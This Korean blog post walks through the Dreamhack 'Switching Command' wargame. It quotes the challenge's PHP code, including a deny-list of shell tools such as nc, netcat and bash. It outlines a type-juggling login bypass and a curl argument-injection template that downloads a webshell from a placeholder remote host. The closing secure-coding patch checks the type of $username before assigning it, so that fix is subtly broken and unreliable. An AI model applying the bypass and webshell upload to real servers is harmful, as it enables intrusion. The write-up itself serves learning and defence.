---
layout: single
title: 'Dreamhack Switching Command를 통해 배우는 PHP의 엄격한 일치 연산자'
sidebar:
    nav: "main"
tag : [dreamhack, web, 웹 해킹, exploit, PHP ]
categories: [wargame, 보안]
toc : true
toc_sticky: true
toc_label: "Contents"
author_profile: true
search: true
comments: true
published: true
---

<div class="notice--success">  
본 포스팅은 드림핵의 가이드라인을 준수하여 작성되었습니다. 전체 익스플로잇 스크립트나 FLAG 값은 포함하지 않으며, 취약점의 원리 분석과 방어 대책에 집중합니다.
</div>

안녕하세요! 오늘은 드림핵(Dreamhack)의 **Switching Command** 워게임 문제를 풀어보며 새롭게 공부할 수 있었던 PHP의 `==` 연산자와 `===` 연산자의 차이점, 그리고 `switch`문에서 발생하는 취약점을 소개하고자 합니다.<br>
스스로 취약점을 분석하고 공격 로직을 세운 과정을 차근차근 정리해 보았습니다.<br>

문제를 풀기 전, 제가 스스로 취약점을 분석하고 공격 로직을 세우기 위해 디딤돌로 삼았던 드림핵 공식 학습 링크와 챌린지 주소를 아래에 공유합니다.<br>

### 🔗 주요 관련 링크 바로가기
{: .no_toc}

| 구분 | 링크 안내 |
| :--- | :--- |
| **선행 학습** | [<📄 드림핵 공식 PHP Command Injection 기본 개념 학습 링크>](https://learn.dreamhack.io/296#4){: .btn .btn--info} |
| **워게임 도전** | [<🎯 드림핵 공식 Switching Command 워게임 챌린지 링크>](https://dreamhack.io/wargame/challenges/1081){: .btn .btn--danger} |

---


## 1.코드 분석


### 1. index.php
{: .no_toc}

```php
if ($_SERVER["REQUEST_METHOD"]=="POST"){
    $data = json_decode($_POST["username"]);
#첫 번째 방어막! {} 딕셔너리 형태로 작성 필요.
    if ($data === null) {  
# JSON 형식의 데이터로 작성
        exit("Failed to parse JSON data");
    }
        
    $username = $data->username;
# 두 번째 방어막 admin 입력시 필터링
    if($username === "admin" ){   
        exit("no hack");
    }
#username에 따른 switch문
    switch($username){  
        case "admin": #admin으로 연결할 경우
            $user = "admin";
            $password = "***REDACTED***";
            $stmt = $conn -> prepare("SELECT * FROM users WHERE username = ? AND password = ?"); # $stmt: SQL Injection방지 ==> SQL Injection이 아니구나 / 객체를 답는 변수
            
            $stmt -> bind_param("ss",$user,$password);
            $stmt -> execute();
            $result = $stmt -> get_result();
            if ($result -> num_rows == 1){
                $_SESSION["auth"] = "admin"; # admin세션을 가지고
                header("Location: test.php"); # test.php로 이동
            } else {
                $message = "Something wrong...";
            }
            break;
        default: # guest로 연결할 경우
            $_SESSION["auth"] = "guest"; #세션이 guest면 test.php로 이동{"username":"guest"}
            header("Location: test.php");
            
    }
}
```
위 코드를 통해 json 형식의 데이터로 값을 입력해야 하며, username에 문자열 "admin"이 들어오면 중간에 차단되는 것을 알 수 있습니다.<br>

**핵심 포인트** (PHP Type Juggling 취약점)<br>

PHP의 switch문은 내부적으로 **느슨한 비교(==)**를 수행합니다.<br>
앞선 if($username === "admin") 검증은 **엄격한 비교(===)**이기 때문에 <font color='#4ADE80'>타입</font>까지 일치해야 하지만, switch($username)는 <font color='#fc2e2e'>타입이 달라도 값의 참/거짓 여부나 숫자로 형변환</font>(Type Coercion)이 일어나며 case "admin"에 매칭될 수 있는 취약점이 존재합니다. <br>

### 2. test.php
{: .no_toc}

```php
$pattern = '/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i';
#pattern 필터링
#admin 세션을 가지고 있을때 ==> 명령어 주입 가능(웹쉘) ==> Command injection
if($_SESSION["auth"] === "admin"){
    $command = isset($_GET["cmd"]) ? $_GET["cmd"] : "ls";  #url에 cmd 값이 있으면 그 값을 실행 없으면 ls명령어 실행
    $sanitized_command = str_replace("\n","",$command); #\n(줄바꿈)을 공백으로 대체
    if (preg_match($pattern, $sanitized_command)){ #블랙리스트 필터링
        exit("No hack");
    }
    $resulttt = shell_exec(escapeshellcmd($sanitized_command)); #입력값에 포함된 메타 문자앞에 /삽입 즉 메타 문자 필터링 ==> 즉, 명령어의 인자로 조작! 우회!(curl 옵션 활용)
}# command 실행 결과를 resulttt변수에 저장
else if($_SESSION["auth"]=== "guest") {
    $command = "echo hi guest";#command 명령어를 입력 할 수 없음
    $result = shell_exec($command);
}
```

위 코드를 통해 오직 admin 세션을 가지고 있을 때만 우리가 원하는 명령어를 주입할 수 있음을 알 수 있습니다.<br> 따라서 공격의 첫 단추는 index.php에서 우회를 통해 admin 세션을 획득하는 것입니다.<br>

또한, `escapeshellcmd()` 함수가 적용되어 있어 `;`, `&&`, `|` 같은 명령어 구분자가 이스케이프 처리되므로, 단순한 명령어 연계보다는 실행할 명령어의 옵션(인자)을 조작하는 우회 기법(예: curl 옵션 활용)을 생각해야 합니다.<br>

admin세션으로 로그인에 성공을 한 이후에는 아래 문제와 비슷하니 참고하시면 좋을 것 같습니다!<br>
[< 드림핵 Command Injection Advanced>](https://dreamhack.io/wargame/challenges/413){: .btn .btn--info} | 

## 2. 가설설정

1. **Type Juggling 우회**: json_decode를 통해 username 파라미터에 문자열이 아닌 Boolean 타입(**직접 찾아보시면 좋습니다! 매우 간단합니다!**)을 주입하여 if문(=== "admin")은 우회하고, switch문(== "admin")은 참이 되도록 유도하여 admin 세션을 획득합니다.

2. **인자 조작(Argument Injection)**: test.php에 접근한 뒤, escapeshellcmd를 우회하기 위해 curl 명령어의 옵션(-o 등)을 활용하여 서버 내에 웹쉘을 업로드합니다.

3. **플래그 획득**: 생성된 웹쉘을 통해 시스템 명령어를 실행하되, 플래그가 C로 컴파일된 바이너리 형태일 경우 단순 cat이 아닌 실행 명령어(/flag)를 통해 최종 FLAG를 획득합니다.

## 3. 스크립트 작성

드림핵의 보안 가이드라인에 따라, 본 포스팅에서는 정답 플래그(FLAG)를 단번에 도출하는 완성형 익스플로잇 스크립트는 공개하지 않습니다.<br> 
대신 공격 핵심 뼈대가 되는 아이디어를 공유합니다.<br>

curl은 다운로드한 파일의 이름을 직접 지정하여 저장할 수 있는 아주 유용한 옵션을 제공합니다.<br>

```bash
curl 인자 [저장할_파일명] [원격_웹쉘_주소]
```

위와 같이 curl의 인자 값을 활용해 취약한 파라미터에 웹쉘 삽입 명령을 주입했습니다.<br>
성공적으로 파일이 생성된 이후, 해당 웹쉘 경로로 이동하여 원격으로 명령어를 실행시킴으로써 성공적으로 문제를 해결할 수 있었습니다.<br>

## 4. 시큐어 코딩

### 1. PHP Type Juggling 및 느슨한 비교 방어
{: .no_toc}

기존 index.php 
```php
// $username이 true(Boolean)로 들어오면 조건문이 참이 됨
if ($username == "admin") { ... }

 switch($username){ 
    ...
 }
```

수정된 index.PHP
```php
// 1. 데이터의 타입이 문자열(string)인지 먼저 검증
 //  [추가] 타입 저글링 원천 차단 (문자열만 허용)
    if (!is_string($username)) {
        exit("Invalid input type");
    }

    $username = $data->username;

    
   #switch 문 형 변환 방지를 위해 if문으로 변경

    if ($username === "admin") {
    // 엄격한 비교를 하므로 true 같은 값으로 우회 불가!
    // 게다가 위에서 "admin" 문자열을 튕겨냈으므로 여기는 절대 실행 안 됨
    $user = "admin";
    $password = "***REDACTED***";

    $stmt = $conn -> prepare("SELECT * FROM users WHERE username = ? AND password = ?"); # $stmt: SQL Injection방지 / 객체를 답는 변수
    $stmt -> bind_param("ss",$user,$password);
    $stmt -> execute();

    $result = $stmt->get_result();
    
    if ($result->num_rows == 1) {
            $_SESSION["auth"] = "admin";
            header("Location: test.php");
            exit();
        } else {
            $message = "Something wrong... (Wrong Password)";
        }
    } 
    else {
        // "admin"이 아닌 모든 일반 문자열 입력은 안전하게 guest로 처리합니다.
        $_SESSION["auth"] = "guest";
        header("Location: test.php");
        exit();
    }

```
기존 코드 로직과의 차이점은 먼저 데이터 타입이 문자열인지 검증을 한 후 "엄격한 비교 연산자" `===` 를 사용해 값과 타입을 모두 검증하게 하여 자동 형 변환으로 인해 로직이 우회되지 않도록 하였습니다.



<div style="text-align: center; margin: 20px 0;">
  <img src="{{ '/images/Switchingcommand/invalid.png' | relative_url }}" 
       alt="test.php로 이동 해볼까?" 
       style="max-width: 80%; height: auto; border: 1px solid #ddd; border-radius: 5px;">
  <p style="font-size: 0.9em; color: #f9f5f5;">[test.php로 이동 해볼까?]</p>
</div>



<div style="text-align: center; margin: 20px 0;">
  <img src="{{ '/images/Switchingcommand/invalid.png' | relative_url }}" 
       alt="차단 성공!" 
       style="max-width: 80%; height: auto; border: 1px solid #ddd; border-radius: 5px;">
  <p style="font-size: 0.9em; color: #f9f5f5;">[차단 성공!]</p>
</div>

기존 코드 로직과의 결정적인 차이점은 먼저 데이터 타입이 문자열인지 검증을 한 후, 엄격한 동등 연산자(===)를 사용해 값과 타입을 모두 비교하도록 설계했다는 점입니다.<br>
이를 통해 자동 형변환으로 인해 인증 로직이 우회되는 현상을 완벽하게 방어했습니다.<br>

**시큐어 코딩 적용 결과 확인**

보안 패치 이후, 타입 변조를 가했을 때 Command Injection을 수행할 수 있는 test.php 페이지로의 비정상적인 진입 자체를 성공적으로 무력화 시켰습니다!

## 마치며

이번 문제는 PHP 언어가 가진 고유한 연산자 특성과 제어문 메커니즘을 깊이 있게 공부해 볼 수 있었던 아주 유익한 문제였습니다. 취약점을 이해하는 것을 넘어 올바른 리팩토링 방향까지 고민해 볼 수 있어 뜻깊었습니다.